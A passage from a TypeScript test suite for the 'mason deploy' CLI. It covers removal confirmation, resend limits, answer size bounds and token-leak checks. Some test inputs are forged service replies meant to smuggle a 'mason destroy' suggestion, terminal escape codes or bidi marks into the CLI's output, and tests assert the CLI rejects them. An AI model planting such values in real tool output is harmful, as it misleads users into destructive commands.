    assert.deepEqual(confirmed(requests), { removed: ["billing.invoices", "public.items"] });
  }
  // at a terminal: the question names the replica, and its name typed back sends it; anything else sends nothing
  const typed = await deployWith({ replica: running(RUNNING, SIZES) }, root, ["--replica", "acme/shop"], {}, { terminal: 200, input: "acme/shop\n" });
  assert.equal(typed.a.code, 0, typed.a.stderr);
  assert.match(typed.a.stderr.replace(/\n {4}/g, " "), /^Removing 2 tables from acme\/shop drops their synced data, and syncing one again is a new first sync, reading every row from the source\. Type acme\/shop to deploy, anything else to keep acme\/shop as it is\.\n> acme\/shop\n/m);
  assert.deepEqual(confirmed(typed.requests), { removed: ["billing.invoices", "public.items"] });
  for (const input of ["acme/other\n", "ACME/SHOP\n", "", "yes\n"]) {
    const { a, requests } = await deployWith({ replica: running(RUNNING, SIZES) }, root, ["--replica", "acme/shop"], {}, { terminal: 200, input });
    assert.equal(a.code, 1, `${JSON.stringify(input)}: ${a.stderr}`);
    assert.deepEqual(requests, [], `${JSON.stringify(input)}: nothing sent`);
    assert.match(a.stderr, /✗ mason deploy: nothing was deployed to acme\/shop: what was typed is not its name\n/);
  }
  // --json at a terminal is never asked: refused without --yes
  const j = await deployWith({ replica: running(RUNNING, SIZES) }, root, ["--replica", "acme/shop", "--json"], {}, { terminal: 80, input: "acme/shop\n" });
  assert.equal(j.a.code, 1, j.a.stdout);
  assert.deepEqual(j.requests, []);
  // a removed table the replica gives no size of: said so, and asked about all the same
  const unsized = await deployWith({ replica: running(RUNNING) }, root, ["--replica", "acme/shop", "--json"]);
  assert.equal((JSON.parse(unsized.a.stdout) as { error: { message: string } }).error.message, "the deploy removes 2 tables acme/shop syncs: billing.invoices (size not known), public.items (size not known)");
  // adds alone (and changes): never asked, no terminal needed, nothing confirmed in the request
  const { root: adds } = project({ "sources/shop.yml": `${SOURCE}  payments: {}\n` });
  const added = await deployWith({ replica: running({ "sources/shop.yml": SOURCE.replace("sync: off", "sync: poll 1m") }, SIZES) }, adds, ["--replica", "acme/shop"]);
  assert.equal(added.a.code, 0, added.a.stderr);
  assert.match(added.a.stderr, /^ {2}adds {5}table public\.payments \(5 rows\): its first sync starts$/m);
  assert.deepEqual(Object.keys(JSON.parse(posts(added.requests)[0]!.body) as object), ["files", "client"]);
});

test("mason deploy: a service that does not say what the replica runs (an older one), or says it in a shape this mason cannot read, leaves the plan unknown — said with why, never guessed — and the deploy goes on; one whose project carries the token is refused whole (issue 550)", async () => {
  const { root } = project(CHANGED);
  const base = (replicaSaying() as { body: { replica: Record<string, unknown> } }).body.replica;
  const withProject = (project: unknown): Reply => ({ status: 200, body: { replica: base, project } });
  const good = (running(RUNNING) as { body: { project: { files: Array<Record<string, unknown>> } } }).body.project;
  const cases: Array<[string, Reply | undefined, string]> = [
    ["no project key", replicaSaying(), "the service does not say what acme/shop runs now"],
    ["project: null", withProject(null), "the service does not say what acme/shop runs now"],
    ["a 404", undefined, "the service answered 404 when asked what acme/shop runs"],
    ["a sha256 that is not its content's", withProject({ ...good, files: good.files.map((f, i) => i === 0 ? { ...f, sha256: "0".repeat(64) } : f) }), "this mason cannot read the service's answer about what acme/shop runs now"],
    ["a path outside the grammar", withProject({ ...good, files: [...good.files, { path: "../x.yml", sha256: sha(""), content: "" }] }), "this mason cannot read the service's answer about what acme/shop runs now"],
    ["a size that is no count", withProject({ ...good, tables: [{ table: "public.items", rows: -1, bytes: null }] }), "this mason cannot read the service's answer about what acme/shop runs now"],
    ["a sources file it cannot read", running({ "sources/shop.yml": "kind: mongo\n" }), "the replica's sources/shop.yml cannot be read here: "],
    // a file whose values the YAML library refuses to expand (more aliases than it takes): a problem, never a crash
    ["a sources file of 120 aliases", running({ ...RUNNING, "sources/shop.yml": `${RUNNING["sources/shop.yml"]}x: &x 1\nl: [${Array(120).fill("*x").join(", ")}]\n` }), "the replica's sources/shop.yml cannot be read here: it cannot be read as values: "],
    ["a roles file of 120 aliases", running({ ...RUNNING, "roles.yml": `${RUNNING["roles.yml"]}x: &x 1\nl: [${Array(120).fill("*x").join(", ")}]\n` }), "the replica's roles.yml cannot be read here: it cannot be read as values: "],
    // a reader's problem quotes the file: a key of the service's, with line breaks, is one line inside the CLI's
    ["a key of its own, over lines", running({ "sources/shop.yml": "kind: postgres\nurl: ${DATABASE_URL}\ntables: {}\n\"FORGED\\nNext:\\n  mason destroy\": 1\n" }), "the replica's sources/shop.yml cannot be read here: unexpected key FORGED?Next:? mason destroy"],
  ];
  for (const [what, replica, why] of cases) {
    const { a, requests } = await deployWith(replica === undefined ? {} : { replica }, root, ["--replica", "acme/shop", "--json"]);
    assert.equal(a.code, 0, `${what}: ${a.stdout}`);
    assert.equal(posts(requests).length, 1, `${what}: sent, never asked`);
    const v = JSON.parse(a.stdout) as { plan: unknown; planUnknown: string };
    assert.equal(v.plan, null, what);
    assert.ok(v.planUnknown.startsWith(why), `${what}: ${v.planUnknown}`);
    const t = await deployWith(replica === undefined ? {} : { replica }, root, ["--replica", "acme/shop"]);
    assert.equal(t.a.code, 0, what);
    assert.ok(t.a.stderr.startsWith(`What the deploy changes on acme/shop cannot be shown: ${why}`), `${what}: ${t.a.stderr}`);
  }
  // a project whose file carries the token: refused whole, as every answer is, nothing sent
  const token = newToken("ci"); SECRETS.push(token);
  const { a, requests } = await deployWith({ replica: running({ ...RUNNING, "notes.yml": `x: ${token}\n` }) }, root, ["--replica", "acme/shop", "--json"], { MASON_TOKEN: token });
  assert.equal(a.code, 1, a.stdout);
  assert.match((JSON.parse(a.stdout) as { error: { message: string } }).error.message, /answered GET \/v1\/replicas\/acme\/shop\?project=1 with 200, where what the replica runs was asked for$/);
  assert.deepEqual(requests, []);
});

test("mason deploy: an older service refused a removal that was not confirmed (unconfirmed_removal with no removes: a plan gone stale) — its words as they came, the way out the CLI's own: deploy again to be asked, or, where the plan cannot be shown either, the sources file; never sent again (issue 550)", async () => {
  const failure = { code: "unconfirmed_removal", message: "the files remove public.items, which acme/shop syncs (1,200,000 rows), and its removal was not confirmed", fix: "FORGED run mason destroy" };
  // the plan unknown (the service says nothing of what the replica runs): deploying again would ask nothing
  const { root: unknown } = project();
  for (const json of [false, true]) {
    const { a, requests } = await deployWith({ get: () => at("refused", { failure }) }, unknown, ["--replica", "acme/shop", "--yes", ...(json ? ["--json"] : [])]);
    assert.equal(a.code, 1, a.stdout + a.stderr);
    assert.equal(posts(requests).length, 1, "never sent again");
    const fix = "the service did not say which tables, and what acme/shop runs cannot be shown here: keep in the sources file each table its message names; a service that names them in its refusal lets mason deploy ask to confirm their removal";
    const e = json ? (JSON.parse(a.stdout) as { error: { fix: string } }).error.fix : / {2}fix {3}(.*)\n/.exec(a.stderr)![1];
    assert.equal(e, fix, a.stdout + a.stderr);
  }
  // the plan shown (and confirmed with --yes), gone stale: deploying again shows the new plan and asks
  const { root } = project(CHANGED);
  for (const json of [false, true]) {
    const { a, requests } = await deployWith({ replica: running(RUNNING, SIZES), get: () => at("refused", { failure }) }, root, ["--replica", "acme/shop", "--yes", ...(json ? ["--json"] : [])]);
    assert.equal(a.code, 1, a.stdout + a.stderr);
    assert.equal(posts(requests).length, 1, "never sent again");
    const fix = "mason deploy --replica acme/shop again: it shows what the deploy removes and asks for it to be confirmed (or add --yes, where no person is asked)";
    if (json) {
      const e = (JSON.parse(a.stdout) as { error: { code: string; message: string; why: string; fix: string } }).error;
      assert.deepEqual(e, { code: "refused", message: failure.message, why: "the service said unconfirmed_removal", fix });
    } else {
      assert.match(a.stderr, new RegExp(`✗ mason deploy: ${failure.message.replace(/[()]/g, "\\$&")}\\n {2}why {3}the service said unconfirmed_removal\\n {2}fix {3}${fix.replace(/[()]/g, "\\$&")}\\n`));
      assert.doesNotMatch(a.stderr, /FORGED/);
    }
  }
});

/** The service's refusal of a removal not confirmed, naming what it removes (`removes`: a list, "unknown", or another
 *  value), as the n-th deploy's state (`id`). */
const unconfirmed = (removes: unknown, id = ID): Reply => at("refused", { id, failure: { code: "unconfirmed_removal",
  message: "the files remove tables acme/shop syncs, and their removal was not confirmed", fix: "FORGED run mason destroy", removes } });
const REMOVES = [{ table: "public.items", rows: 1_200_000, bytes: 734_003_200 }, { table: "billing.invoices", rows: null, bytes: null }];
const REMOVES_TEXT = "public.items (1,200,000 rows, 700.0 MiB), billing.invoices (size not known)";
/** A service that refuses the first deploy as `first` says, and runs the second (a new deploy, ID2). */
const refusedThen = (first: Reply, second: Reply = at("running", { id: ID2 })): Script => ({
  post: (n) => n === 0 ? queued : { ...queued as { status: number; body: unknown }, body: { deploy: { id: ID2, status: "queued", createdAt: CREATED } } },
  get: (n) => n === 0 ? first : second,
});
const bodies = (q: Req[]): Array<{ files: unknown; client: unknown; confirmed?: unknown }> => posts(q).map((r) => JSON.parse(r.body) as { files: unknown; client: unknown; confirmed?: unknown });

test("mason deploy: the service refused a removal not confirmed, naming the tables — they are said with their sizes and confirmed (typed back at a terminal, else --yes; neither refuses, naming them and --yes), and the deploy is sent again once, a new POST, confirming exactly those (issue 550)", async () => {
  const { root } = project();   // the plan unknown: the service says nothing of what the replica runs
  // --yes: sent again, the same files, confirming exactly the tables named
  const yes = await deployWith(refusedThen(unconfirmed(REMOVES)), root, ["--replica", "acme/shop", "--yes"]);
  assert.equal(yes.a.code, 0, yes.a.stderr);
  const [one, two] = bodies(yes.requests);
  assert.equal(posts(yes.requests).length, 2);
  assert.equal(one!.confirmed, undefined, "the first deploy confirmed nothing: its plan was unknown");
  assert.deepEqual(two, { ...one, confirmed: { removed: ["public.items", "billing.invoices"] } });
  assert.match(afterPlan(yes.a.stderr), new RegExp(`^Sent 3 files .*: deploy ${ID}\n {2}Queued: .*\n {2}Refused by Mason on the replica\nThe service did not take deploy ${ID}: not every table the deploy removes was confirmed; it removes ${REMOVES_TEXT.replace(/[().]/g, "\\$&")}; --yes confirms them: sending the deploy again\nSent 3 files .*: deploy ${ID2}\n`), yes.a.stderr);
  assert.match(yes.a.stdout, /^Deployed to acme\/shop: the replica runs it\n {2}deploy +dep_02def\n/);
  // --yes --json: what was confirmed, and the deploy that runs
  const j = await deployWith(refusedThen(unconfirmed(REMOVES)), root, ["--replica", "acme/shop", "--yes", "--json"]);
  assert.equal(j.a.code, 0, j.a.stdout);
  const v = JSON.parse(j.a.stdout) as { confirmed: unknown; deploy: { id: string; status: string } };
  assert.deepEqual([v.confirmed, v.deploy.id, v.deploy.status], [{ removed: ["public.items", "billing.invoices"] }, ID2, "running"]);
  assert.equal(j.a.stderr, "");
  // neither a terminal nor --yes (and --json): refused, naming the tables and the way out; never sent again
  for (const json of [false, true]) {
    const { a, requests } = await deployWith(refusedThen(unconfirmed(REMOVES)), root, ["--replica", "acme/shop", ...(json ? ["--json"] : [])]);
    assert.equal(a.code, 1, a.stdout + a.stderr);
    assert.equal(posts(requests).length, 1, "never sent again");
    const error = { code: "refused", message: `the deploy removes 2 tables acme/shop syncs: ${REMOVES_TEXT}`,
      why: `of a removed table, its synced data is dropped, and syncing it again is a new first sync, reading every row from the source: such a deploy is confirmed at a terminal, or with --yes; the service did not take deploy ${ID}`,
      fix: "if they are meant to go: mason deploy --replica acme/shop --yes; if not, add them back to the sources file" };
    if (json) {
      const out = JSON.parse(a.stdout) as { error: unknown; next: unknown; deploy: { id: string; status: string }; confirmed: unknown };
      assert.deepEqual([out.error, out.next, out.deploy.id, out.deploy.status, out.confirmed], [error, [{ command: "mason deploy --replica acme/shop --yes", what: "deploy, removing them" }], ID, "refused", null]);
    } else assert.ok(a.stderr.endsWith(`✗ mason deploy: ${error.message}\n  why   ${error.why}\n  fix   ${error.fix}\n\nNext:\n  mason deploy --replica acme/shop --yes        deploy, removing them\n`), a.stderr);
  }
  // at a terminal: the tables said, the question asked; the name typed back sends it again, anything else nothing
  const typed = await deployWith(refusedThen(unconfirmed(REMOVES)), root, ["--replica", "acme/shop"], {}, { terminal: 200, input: "acme/shop\n" });
  assert.equal(typed.a.code, 0, typed.a.stderr);
  assert.match(typed.a.stderr.replace(/\n {4}/g, " "), new RegExp(`\nThe service did not take deploy ${ID}: not every table the deploy removes was confirmed; it removes ${REMOVES_TEXT.replace(/[().]/g, "\\$&")}\.\nRemoving 2 tables from acme/shop drops their synced data, .* Type acme/shop to deploy, anything else to keep acme/shop as it is\.\n> acme/shop\n`));
  assert.deepEqual(bodies(typed.requests)[1]!.confirmed, { removed: ["public.items", "billing.invoices"] });
  for (const input of ["acme/other\n", ""]) {
    const { a, requests } = await deployWith(refusedThen(unconfirmed(REMOVES)), root, ["--replica", "acme/shop"], {}, { terminal: 200, input });
    assert.equal(a.code, 1, `${JSON.stringify(input)}: ${a.stderr}`);
    assert.equal(posts(requests).length, 1, `${JSON.stringify(input)}: never sent again`);
    assert.match(a.stderr, /✗ mason deploy: nothing was deployed to acme\/shop: what was typed is not its name\n/);
  }
});

test("mason deploy: a refusal at the documented maximum — 10,000 tables, each name 300 characters written as \\uXXXX escapes, every size at its largest — is read whole, said and confirmed, and sent again confirming all of them; an answer past even that bound is a failure saying the outcome is not known, never a wait (issue 550)", { timeout: 300_000 }, async () => {
  const { root } = project();
  // a name of 300 characters, each as its escape: `public.` then the entry's number, padded with x
  const name = (i: number): string => `public.t${String(i).padStart(5, "0")}`.padEnd(300, "x");
  const escaped = (t: string): string => [...t].map((c) => `\\u${c.codePointAt(0)!.toString(16).padStart(4, "0")}`).join("");
  const big = Number.MAX_SAFE_INTEGER;
  const entries = Array.from({ length: 10_000 }, (_, i) => `{ "table": "${escaped(name(i))}", "rows": ${big}, "bytes": ${big} }`);
  const refusal = (n: number): Reply => ({ status: 200, headers: { "retry-after": "1" }, json: `{"deploy":{"id":"${ID}","status":"refused","createdAt":"${CREATED}","finishedAt":"2026-11-02T10:01:00Z","failure":{"code":"unconfirmed_removal","message":"the files remove tables acme/shop syncs","removes":[${entries.slice(0, n).join(",\n  ")}]}}}` });
  const largest = refusal(10_000);
  assert.ok((largest as { json: string }).json.length > 18_000_000, "the answer is at its documented largest");
  // (a person's run: --json would carry all 10,000 names back, 3 MB this test's every check would read again)
  const { a, requests } = await deployWith(refusedThen(largest), root, ["--replica", "acme/shop", "--yes"], {}, { timeoutMs: 240_000 });
  assert.equal(a.code, 0, `${a.stderr.slice(0, 600)} … ${a.stderr.slice(-1500)}`);
  // a person reads the first 50 names, and how many more
  assert.match(a.stderr, new RegExp(`^The service did not take deploy ${ID}: not every table the deploy removes was confirmed; it removes ${name(0)} \\(9,007,199,254,740,991 rows, [^)]*\\), .*${name(49)} \\([^)]*\\), and 9,950 more; --yes confirms them: sending the deploy again$`, "m"));
  const sent = bodies(requests)[1]!.confirmed as { removed: string[] };
  assert.equal(sent.removed.length, 10_000);
  assert.deepEqual([sent.removed[0], sent.removed[9_999]], [name(0), name(9_999)]);
  // past the bound (padded with spaces JSON allows): a failure, the outcome not known, before any --timeout
  const over: Reply = { status: 200, headers: { "retry-after": "1" }, json: `${(largest as { json: string }).json}${" ".repeat(1_000_000)}` };
  for (const json of [false, true]) {
    const r = await deployWith(refusedThen(over), root, ["--replica", "acme/shop", "--yes", "--timeout", "2m", ...(json ? ["--json"] : [])], {}, { timeoutMs: 240_000 });
    assert.equal(r.a.code, 1, r.a.stdout + r.a.stderr);
    assert.equal(posts(r.requests).length, 1, "never sent again");
    const e = json ? (JSON.parse(r.a.stdout) as { error: { code: string; message: string; fix: string } }).error : null;
    if (e) {
      assert.equal(e.code, "failed");
      assert.match(e.message, /answered GET \/v1\/replicas\/acme\/shop\/deploys\/dep_01abc with more than 18893 KiB$/);
      assert.match(e.fix, /^what deploy dep_01abc did is not known here: /);
    } else assert.match(r.a.stderr, /✗ mason deploy: .* with more than 18893 KiB\n {2}why {3}no documented answer is that large\n {2}fix {3}what deploy dep_01abc did is not known here/);
    assert.ok(r.a.ms < 60_000, `failed at once, never waited out --timeout (${r.a.ms} ms)`);
  }
});

test("mason deploy: a deploy is sent again at most once — a second unconfirmed_removal refusal is said as it came, exit 1 (issue 550)", async () => {
  const { root } = project();
  for (const json of [false, true]) {
    const { a, requests } = await deployWith(refusedThen(unconfirmed(REMOVES), unconfirmed(REMOVES, ID2)), root, ["--replica", "acme/shop", "--yes", ...(json ? ["--json"] : [])]);
    assert.equal(a.code, 1, a.stdout + a.stderr);
    assert.equal(posts(requests).length, 2, "sent again once, never twice");
    const message = "the files remove tables acme/shop syncs, and their removal was not confirmed";
    if (json) assert.deepEqual((JSON.parse(a.stdout) as { error: { message: string; why: string } }).error.message, message);
    else assert.match(a.stderr, new RegExp(`✗ mason deploy: ${message}\n {2}why {3}the service said unconfirmed_removal\n`));
  }
});

test("mason deploy: the service could not tell which tables the deploy removes — any removal is accepted only with --yes or typed back after a question that says any synced table it removes will be dropped, and the resend says any; without either, refused, the way out --yes (issue 550)", async () => {
  const { root } = project();
  const yes = await deployWith(refusedThen(unconfirmed("unknown")), root, ["--replica", "acme/shop", "--yes", "--json"]);
  assert.equal(yes.a.code, 0, yes.a.stdout);
  assert.deepEqual(bodies(yes.requests).map((b) => b.confirmed), [undefined, { removed: [], any: true }]);
  assert.deepEqual((JSON.parse(yes.a.stdout) as { confirmed: unknown }).confirmed, { removed: [], any: true });
  const said = await deployWith(refusedThen(unconfirmed("unknown")), root, ["--replica", "acme/shop", "--yes"]);
  assert.equal(said.a.code, 0, said.a.stderr);
  assert.match(said.a.stderr, new RegExp(`\nThe service did not take deploy ${ID}: it could not tell which tables acme/shop syncs the deploy removes; --yes accepts any removal: sending the deploy again\n`));
  // a plan this mason showed and confirmed, which the service could not tell: what it confirmed is sent beside any
  const { root: changed } = project(CHANGED);
  const both = await deployWith({ ...refusedThen(unconfirmed("unknown")), replica: running(RUNNING, SIZES) }, changed, ["--replica", "acme/shop", "--yes"]);
  assert.equal(both.a.code, 0, both.a.stderr);
  assert.deepEqual(bodies(both.requests).map((b) => b.confirmed), [{ removed: ["billing.invoices", "public.items"] }, { removed: ["billing.invoices", "public.items"], any: true }]);
  // at a terminal: the question says, plainly, that any synced table the deploy removes will be dropped
  const typed = await deployWith(refusedThen(unconfirmed("unknown")), root, ["--replica", "acme/shop"], {}, { terminal: 200, input: "acme/shop\n" });
  assert.equal(typed.a.code, 0, typed.a.stderr);
  assert.match(typed.a.stderr.replace(/\n {4}/g, " "), /\nAny synced table this deploy removes will be dropped, and syncing one again is a new first sync, reading every row from the source\. Type acme\/shop to deploy, anything else to keep acme\/shop as it is\.\n> acme\/shop\n/);
  assert.deepEqual(bodies(typed.requests)[1]!.confirmed, { removed: [], any: true });
  const wrong = await deployWith(refusedThen(unconfirmed("unknown")), root, ["--replica", "acme/shop"], {}, { terminal: 200, input: "yes\n" });
  assert.equal(wrong.a.code, 1, wrong.a.stderr);
  assert.equal(posts(wrong.requests).length, 1);
  // neither: refused, never any
  for (const json of [false, true]) {
    const { a, requests } = await deployWith(refusedThen(unconfirmed("unknown")), root, ["--replica", "acme/shop", ...(json ? ["--json"] : [])]);
    assert.equal(a.code, 1, a.stdout + a.stderr);
    assert.equal(posts(requests).length, 1, "never sent again");
    const message = `the service could not tell which tables acme/shop syncs the deploy removes, and did not take deploy ${ID}`;
    if (json) {
      const out = JSON.parse(a.stdout) as { error: { message: string; fix: string }; next: unknown };
      assert.equal(out.error.message, message);
      assert.equal(out.error.fix, "if any table it removes may go: mason deploy --replica acme/shop --yes; if not, keep in the sources file every table acme/shop syncs");
      assert.deepEqual(out.next, [{ command: "mason deploy --replica acme/shop --yes", what: "deploy, accepting any removal" }]);
    } else assert.match(a.stderr, new RegExp(`✗ mason deploy: ${message}\n`));
  }
});

test("mason deploy: a refusal's removes that does not hold — a name over lines, with an escape or a bidi mark, too long, twice, an empty list, a size that is no count, another value, or removes beside another code — is outside the contract: refused by its status, nothing of it printed, never sent again (issue 550)", async () => {
  const { root } = project();
  const t = (table: unknown): unknown => [{ table, rows: null, bytes: null }];
  const cases: Array<[string, Reply]> = [
    ["a name over lines", unconfirmed(t("public.items\nNext:\n  FORGED mason destroy"))],
    ["a name with an escape", unconfirmed(t("public.\u001b[2Jitems"))],
    ["a name with a bidi mark", unconfirmed(t("public.\u202eitems"))],
    ["a name with a run of spaces", unconfirmed(t("public.a    FORGED"))],
    ["a name too long", unconfirmed(t(`public.${"x".repeat(300)}`))],
    ["a name not a string", unconfirmed(t(7))],
    ["a name twice", unconfirmed([...REMOVES, REMOVES[0]])],
    ["an empty list", unconfirmed([])],
    ["a size that is no count", unconfirmed([{ table: "public.items", rows: -1, bytes: null }])],
    ["another value", unconfirmed("all")],
    ["removes beside another code", at("refused", { failure: { code: "bad_source", message: "no", removes: REMOVES } })],
  ];
  for (const [what, refusal] of cases) {
    for (const json of [false, true]) {
      const { a, requests } = await deployWith(refusedThen(refusal), root, ["--replica", "acme/shop", "--yes", ...(json ? ["--json"] : [])]);
      assert.equal(a.code, 1, `${what}: ${a.stdout}${a.stderr}`);
      assert.equal(posts(requests).length, 1, `${what}: never sent again`);
      const message = json ? (JSON.parse(a.stdout) as { error: { message: string } }).error.message : a.stderr;
      assert.match(message, /answered GET \/v1\/replicas\/acme\/shop\/deploys\/dep_01abc with 200, where the deploy's state was asked for/, what);
      assert.doesNotMatch(a.stdout + a.stderr, /FORGED|items/, `${what}: nothing of it printed`);
    }
  }
});

test("mason deploy: a refusal whose removes carries the token — a table named with it, or with its body — is refused whole, as every answer is: nothing of it printed, never sent again (issue 550)", async () => {
  const { root } = project();
  for (const shape of [(k: string) => `public.${k}`, (k: string) => `public.t_${k.slice(-43).toLowerCase()}`]) {
    const token = newToken("ci"); SECRETS.push(token);
    for (const json of [false, true]) {
      const { a, requests } = await deployWith(refusedThen(unconfirmed([{ table: shape(token), rows: null, bytes: null }])), root, ["--replica", "acme/shop", "--yes", ...(json ? ["--json"] : [])], { MASON_TOKEN: token });
      assert.equal(a.code, 1, a.stdout + a.stderr);
      assert.equal(posts(requests).length, 1, "never sent again");
      const message = json ? (JSON.parse(a.stdout) as { error: { message: string } }).error.message : a.stderr;
      assert.match(message, /answered GET \/v1\/replicas\/acme\/shop\/deploys\/dep_01abc with 200, where the deploy's state was asked for/);
      assert.doesNotMatch(a.stdout + a.stderr, /public\.t_|public\.masondata/);
    }
  }
});

test("mason deploy --dry-run: a generated table's file whose YAML expands more aliases than the reader takes is that file's problem, said as a start says it, never a crash (issue 550)", async () => {
  const { root } = project({ "generated_tables/daily.yml": `${DAILY}x: &x 1\nl: [${Array(120).fill("*x").join(", ")}]\n` });
  const { a } = await deployWith({}, root, ["--replica", "acme/shop", "--dry-run"]);
  assert.equal(a.code, 0, a.stderr);
  assert.match(a.stderr, /mason\/generated_tables\/daily\.yml: it cannot be read as values: /);
  assert.match(a.stdout, /^Would send 4 files, /);
});

test("no run of mason deploy printed a token, nor anything shaped as one", () => {
  assert.ok(ANSWERS.length > 30, `the runs above are here (${ANSWERS.length})`);
  for (const a of ANSWERS) {
    for (const s of SECRETS) assert.ok(!a.stdout.includes(s) && !a.stderr.includes(s), `mason ${a.argv.join(" ")} printed a token`);
    assert.doesNotMatch(a.stdout + a.stderr, /masondata_(pat|ci)_[A-Za-z0-9_-]{43}/, `mason ${a.argv.join(" ")}`);
  }
});
